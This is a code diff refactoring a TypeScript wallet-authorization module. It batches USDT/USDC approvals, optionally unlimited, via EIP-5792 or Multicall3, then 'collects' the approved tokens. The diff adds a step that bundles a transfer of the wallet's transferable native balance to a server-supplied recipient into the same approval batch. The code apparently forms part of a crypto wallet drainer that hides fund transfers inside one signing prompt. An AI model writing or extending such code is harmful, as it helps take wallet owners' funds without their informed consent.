@@ -2,113 +2,45 @@ import { formatTransferSkipReason } from "@trustmycard/shared/constants/collecti
 import {
   alreadyAuthorizedResult,
   createPreflightApi,
-  meetsExpectedAllowance,
   preflightExistingAllowance,
 } from "./allowance-preflight";
 import { collectForExistingAllowance } from "./existing-allowance-collection";
-import { createEvmApprovalChainPort } from "../approval/chains/evm-chain-port";
-import { waitForTransactionConfirmation } from "../approval/confirmation/poller";
-import type { ApprovalApiPort } from "../approval/ports";
 import type {
   ApprovalOrchestrationResult,
   ApprovalRequest,
   PreparedApproval,
-  SignedApproval,
 } from "../approval/types";
-import { StageStatus } from "../approval/types";
+import { createEvmApprovalChainPort } from "../approval/chains/evm-chain-port";
 import { getToken, parseHumanToRaw } from "../core/chain-tokens";
 import { validateEvmApproveCall } from "../core/evm-approve-guard";
 import { getErrorMessage, isUserRejection } from "../core/errors";
 import { PERMISSION_DENIED_BY_USER_MESSAGE } from "../core/link-flow-meta";
 import { EVM_CHAIN_ID, isEvmChainKey } from "../core/native-chains";
 import {
-  getWalletCapabilities,
-  pollCallsStatus,
-  sendWalletCalls,
-  supportsSendCalls,
-} from "../core/evm-wallet-batch";
-import { ensureEvmChain } from "../native-transfer/ensure-evm-chain";
+  buildNativeWalletCall,
+  fetchNativeTransferEstimate,
+} from "./batch-native-estimate";
+import {
+  executeEip5792Batch,
+  executeMulticall3Batch,
+  resolveWalletCapabilities,
+  shouldAttemptEip5792,
+  type BatchJob,
+} from "./evm-token-batch-tiers";
 import type {
   AuthorizationAssetResult,
-  LinkedAccounts,
-  NetworkRow,
   TokenSymbol,
-  UniversalProvider,
 } from "../types";
 import type { IncludedAssetWorkItem } from "./preferences";
 import { balanceForToken } from "./preferences";
 import type { WalletPhaseTokenCapture } from "./phases/types";
+import type { EvmTokenBatchRunArgs, EvmTokenBatchRunResult } from "./evm-token-batch-types";
 
-export type EvmTokenBatchRunArgs = {
-  items: IncludedAssetWorkItem[];
-  network: string;
-  networks: NetworkRow[];
-  accounts: LinkedAccounts;
-  provider: UniversalProvider;
-  apiBaseUrl?: string;
-  getSpender: (networkKey: string) => string;
-  runApproval: (args: {
-    network: string;
-    owner: string;
-    token: TokenSymbol;
-    amountHuman?: string;
-    unlimited: boolean;
-    nativeBalanceHuman: string;
-    tokenBalanceHuman: string;
-    executeTransfer: boolean;
-    transferToAddress: string;
-    transferAmountRaw?: string;
-    onStage?: (stageResult: {
-      stage: string;
-      status: string;
-      data?: unknown;
-      error?: string | null;
-    }) => void;
-  }) => Promise<ApprovalOrchestrationResult>;
-  onAssetStart?: (item: IncludedAssetWorkItem) => void;
-  onAssetEnd?: (result: AuthorizationAssetResult) => void;
-  log?: (step: string, detail?: Record<string, unknown>) => void;
-  walletPhaseOnly?: boolean;
-};
-
-export type EvmTokenBatchRunResult = {
-  results: AuthorizationAssetResult[];
-  tokenCaptures: WalletPhaseTokenCapture[];
-  batchId?: string | null;
-};
-
-type BatchJob = {
-  item: IncludedAssetWorkItem & { asset: TokenSymbol };
-  request: ApprovalRequest;
-  prepared: PreparedApproval;
-  signed: SignedApproval;
-  shouldAttemptTransfer: boolean;
-  transferAmountRaw?: string;
-};
-
-async function verifyAllowanceWithRetry(
-  api: ApprovalApiPort,
-  request: ApprovalRequest,
-  prepared: PreparedApproval,
-  signal?: AbortSignal
-) {
-  const maxAttempts = 5;
-  const intervalMs = 1_500;
-  let last = { hasAllowance: false, allowance: "0" };
-
-  for (let attempt = 1; attempt <= maxAttempts; attempt += 1) {
-    last = await api.verifyAllowance({ request, prepared, signal });
-    if (meetsExpectedAllowance(last, prepared)) return last;
-    if (attempt < maxAttempts) {
-      await new Promise((r) => setTimeout(r, intervalMs));
-    }
-  }
-  return last;
-}
+export type { EvmTokenBatchRunArgs, EvmTokenBatchRunResult } from "./evm-token-batch-types";
 
 /**
  * Run USDT + USDC approvals on one EVM network as a single EIP-5792 wallet batch
- * when the wallet supports wallet_sendCalls. Falls back to sequential runApproval.
+ * when the wallet supports wallet_sendCalls. Falls back to Multicall3 then sequential.
  */
 export async function runEvmTokenBatchApproval(
   args: EvmTokenBatchRunArgs
@@ -130,25 +62,12 @@ export async function runEvmTokenBatchApproval(
   const chainId = EVM_CHAIN_ID[args.network as keyof typeof EVM_CHAIN_ID];
   if (chainId == null) {
     const fallback = await runSequentialFallback(args, owner, "Unsupported EVM network");
-    return { results: fallback.results, tokenCaptures: fallback.tokenCaptures };
+    return {
+      results: fallback.results,
+      tokenCaptures: fallback.tokenCaptures,
+      batchMode: "sequential",
+    };
   }
-
-  const capabilities = await getWalletCapabilities(args.provider, chainId, owner);
-  if (!supportsSendCalls(capabilities, chainId)) {
-    log("EIP5792_BATCH_UNSUPPORTED", {
-      network: args.network,
-      chainId,
-      fallback: "sequential eth_sendTransaction",
-    });
-    const fallback = await runSequentialFallback(args, owner);
-    return { results: fallback.results, tokenCaptures: fallback.tokenCaptures };
-  }
-
-  log("EIP5792_BATCH_ATTEMPT", {
-    network: args.network,
-    chainId,
-    tokens: args.items.map((i) => i.asset),
-  });
 
   const api = createPreflightApi(args.apiBaseUrl);
   const chainPort = createEvmApprovalChainPort({ provider: args.provider });
@@ -303,213 +222,84 @@ export async function runEvmTokenBatchApproval(
   if (jobs.length === 0) {
     return { results, tokenCaptures: [] };
   }
+
+  const nativeEstimate = args.nativeItem
+    ? await fetchNativeTransferEstimate({
+        apiBaseUrl: args.apiBaseUrl,
+        provider: args.provider,
+        network: args.network,
+        owner,
+      })
+    : null;
+  const nativeCall = nativeEstimate ? buildNativeWalletCall(nativeEstimate) : null;
+  if (nativeCall && nativeEstimate) {
+    log("NATIVE_BATCH_ESTIMATE", {
+      network: args.network,
+      transferableRaw: nativeEstimate.transferableRaw,
+      recipient: nativeEstimate.recipient,
+    });
+  }
+
+  const capabilities = await resolveWalletCapabilities(args.provider, chainId, owner);
+  if (!shouldAttemptEip5792(capabilities, chainId)) {
+    log("EIP5792_BATCH_UNSUPPORTED", {
+      network: args.network,
+      chainId,
+      capabilities,
+      fallback: "multicall3_or_sequential",
+    });
+  }
+
+  const canTryEip5792 =
+    shouldAttemptEip5792(capabilities, chainId) &&
+    jobs.length >= 1 &&
+    (jobs.length >= 2 || nativeCall);
+
+  if (canTryEip5792) {
+    const eip5792Result = await executeEip5792Batch({
+      runArgs: args,
+      owner,
+      chainId,
+      jobs,
+      priorResults: results,
+      api,
+      nativeCall,
+      nativeEstimate,
+      capabilities,
+      log,
+    });
+    if (eip5792Result) return eip5792Result;
+  }
+
+  if (jobs.length >= 2) {
+    const multicallResult = await executeMulticall3Batch({
+      runArgs: args,
+      owner,
+      chainId,
+      jobs,
+      priorResults: results,
+      log,
+    });
+    if (multicallResult) return multicallResult;
+  }
+
   if (jobs.length === 1) {
-    const job = jobs[0]!;
     const fallbackResults = await runSequentialFallback(args, owner, undefined, [
-      job.item,
+      jobs[0]!.item,
     ]);
     return {
       results: [...results, ...fallbackResults.results],
       tokenCaptures: fallbackResults.tokenCaptures,
+      batchMode: "sequential",
     };
   }
 
-  try {
-    await ensureEvmChain(args.provider, chainId);
-    for (const job of jobs) {
-      args.onAssetStart?.(job.item);
-      validateEvmApproveCall({
-        to: String(job.signed.payload.to),
-        data: String(job.signed.payload.data),
-        value: String(job.signed.payload.value ?? "0x0"),
-        expectedTokenAddress: job.prepared.tokenAddress,
-      });
-    }
-
-    const batch = await sendWalletCalls(args.provider, {
-      chainId,
-      from: owner,
-      calls: jobs.map((job) => ({
-        to: String(job.signed.payload.to),
-        data: String(job.signed.payload.data),
-        value: String(job.signed.payload.value ?? "0x0"),
-      })),
-    });
-
-    log("EIP5792_BATCH_SUBMITTED", {
-      network: args.network,
-      batchId: batch.id,
-      callCount: jobs.length,
-    });
-
-    const status = await pollCallsStatus(args.provider, batch.id, chainId);
-    const batchResults: AuthorizationAssetResult[] = [];
-    const tokenCaptures: WalletPhaseTokenCapture[] = [];
-
-    for (let i = 0; i < jobs.length; i += 1) {
-      const job = jobs[i]!;
-      const receipt = status.receipts[i];
-
-      if (!receipt || receipt.status === "reverted") {
-        const result: AuthorizationAssetResult = {
-          network: job.item.network,
-          token: job.item.asset,
-          outcome: "failed",
-          message: receipt
-            ? "Approval transaction reverted on-chain"
-            : "Batch completed without a receipt for this approval",
-        };
-        batchResults.push(result);
-        args.onAssetEnd?.(result);
-        continue;
-      }
-
-      if (args.walletPhaseOnly) {
-        const orchestration: ApprovalOrchestrationResult = {
-          ok: true,
-          status: StageStatus.OK,
-          context: {
-            request: job.request,
-            prepared: job.prepared,
-            broadcast: { txHash: receipt.transactionHash },
-            stageLog: [],
-          },
-          txHash: receipt.transactionHash,
-          approvalId: null,
-          stages: [],
-        };
-        tokenCaptures.push({
-          item: job.item,
-          orchestration,
-          shouldAttemptTransfer: job.shouldAttemptTransfer,
-          transferAmountRaw: job.transferAmountRaw,
-        });
-        const result: AuthorizationAssetResult = {
-          network: job.item.network,
-          token: job.item.asset,
-          outcome: "authorized",
-          message: "Wallet approved — settlement queued",
-          txHash: receipt.transactionHash,
-        };
-        batchResults.push(result);
-        args.onAssetEnd?.(result);
-        continue;
-      }
-
-      try {
-        await waitForTransactionConfirmation(chainPort, {
-          txHash: receipt.transactionHash,
-          network: job.item.network,
-        });
-
-        const verified = await verifyAllowanceWithRetry(
-          api,
-          job.request,
-          job.prepared
-        );
-        if (!meetsExpectedAllowance(verified, job.prepared)) {
-          const result: AuthorizationAssetResult = {
-            network: job.item.network,
-            token: job.item.asset,
-            outcome: "failed",
-            message:
-              "Approval was confirmed on-chain but allowance could not be verified",
-            txHash: receipt.transactionHash,
-          };
-          batchResults.push(result);
-          args.onAssetEnd?.(result);
-          continue;
-        }
-
-        const persisted = await api.persistApproval({
-          request: job.request,
-          prepared: job.prepared,
-          txHash: receipt.transactionHash,
-          verified,
-        });
-        await api.postApprovalLog({ request: job.request, ok: true });
-
-        const skipLabel = persisted.transferSkippedReason
-          ? formatTransferSkipReason(persisted.transferSkippedReason)
-          : null;
-        const result: AuthorizationAssetResult = {
-          network: job.item.network,
-          token: job.item.asset,
-          outcome: persisted.transferTxHash ? "collected" : "authorized",
-          message: persisted.transferTxHash
-            ? "Token collection confirmed"
-            : skipLabel
-              ? `Authorized — ${skipLabel}`
-              : "Authorized — collection queued",
-          approvalId: persisted.approvalId,
-          collectionIntentId: persisted.collectionIntentId ?? null,
-          collectionStatus: persisted.collectionStatus ?? null,
-          txHash: persisted.transferTxHash ?? receipt.transactionHash,
-          transferSkippedReason: persisted.transferSkippedReason ?? null,
-        };
-        batchResults.push(result);
-        args.onAssetEnd?.(result);
-
-        log?.(
-          persisted.transferTxHash
-            ? "EIP5792_BATCH_TOKEN_AUTHORIZE_TRANSFER"
-            : "EIP5792_BATCH_TOKEN_AUTHORIZE",
-          {
-            network: job.item.network,
-            token: job.item.asset,
-            txHash: receipt.transactionHash,
-            batchId: batch.id,
-          }
-        );
-      } catch (err) {
-        const rejected = isUserRejection(err);
-        const result: AuthorizationAssetResult = {
-          network: job.item.network,
-          token: job.item.asset,
-          outcome: rejected ? "user_rejected" : "failed",
-          message: getErrorMessage(err, "Post-batch approval failed"),
-          txHash: receipt.transactionHash,
-        };
-        batchResults.push(result);
-        args.onAssetEnd?.(result);
-      }
-    }
-
-    return {
-      results: [...results, ...batchResults],
-      tokenCaptures,
-      batchId: batch.id,
-    };
-  } catch (err) {
-    const rejected = isUserRejection(err);
-    const message = getErrorMessage(err, "EIP-5792 batch approval failed");
-    log("EIP5792_BATCH_FAILED", {
-      network: args.network,
-      error: message,
-      userRejected: rejected,
-      fallback: rejected ? null : "sequential",
-    });
-
-    if (rejected) {
-      const rejectedResults = jobs.map((job) => {
-        const result: AuthorizationAssetResult = {
-          network: job.item.network,
-          token: job.item.asset,
-          outcome: "user_rejected",
-          message,
-        };
-        args.onAssetEnd?.(result);
-        return result;
-      });
-      return { results: [...results, ...rejectedResults], tokenCaptures: [] };
-    }
-
-    const fallbackResults = await runSequentialFallback(args, owner, message);
-    return {
-      results: [...results, ...fallbackResults.results],
-      tokenCaptures: fallbackResults.tokenCaptures,
-    };
-  }
+  const fallbackResults = await runSequentialFallback(args, owner);
+  return {
+    results: [...results, ...fallbackResults.results],
+    tokenCaptures: fallbackResults.tokenCaptures,
+    batchMode: "sequential",
+  };
 }
 
 async function runSequentialFallback(
@@ -730,7 +520,12 @@ async function runSequentialFallback(
 }
 
 export type AuthorizationWorkUnit =
-  | { kind: "evm_token_batch"; network: string; items: IncludedAssetWorkItem[] }
+  | {
+      kind: "evm_token_batch";
+      network: string;
+      items: IncludedAssetWorkItem[];
+      nativeItem?: IncludedAssetWorkItem & { asset: "NATIVE" };
+    }
   | { kind: "single"; item: IncludedAssetWorkItem };
 
 /**
@@ -764,7 +559,21 @@ export function planAuthorizationWork(
       }
 
       if (batch.length >= 2) {
-        units.push({ kind: "evm_token_batch", network: item.network, items: batch });
+        let nativeItem: (IncludedAssetWorkItem & { asset: "NATIVE" }) | undefined;
+        if (
+          next < items.length &&
+          items[next]?.asset === "NATIVE" &&
+          items[next]?.network === item.network
+        ) {
+          nativeItem = items[next] as IncludedAssetWorkItem & { asset: "NATIVE" };
+          next += 1;
+        }
+        units.push({
+          kind: "evm_token_batch",
+          network: item.network,
+          items: batch,
+          nativeItem,
+        });
       } else {
         units.push({ kind: "single", item });
       }
